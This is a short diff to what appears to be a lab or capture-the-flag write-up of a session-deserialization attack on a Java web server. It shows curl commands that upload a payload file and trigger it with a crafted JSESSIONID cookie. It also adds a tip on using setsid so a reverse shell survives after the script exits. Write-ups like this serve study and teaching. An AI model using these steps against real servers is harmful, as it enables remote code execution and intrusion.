@@ -60,6 +60,7 @@ curl -s -X PUT -H "Content-Length: $(wc -c < payload.bin)" -H "Content-Range: by
 <!-- Trigger payload -->
 curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
 ```
+Initial payloads failed, due to the payload script completing before the shell was established, killing the shell. Use setsid to detach the shell process from the script, allowing it to establish the connection.
 
 The payload used setid and ran the shell was:
 ```sh
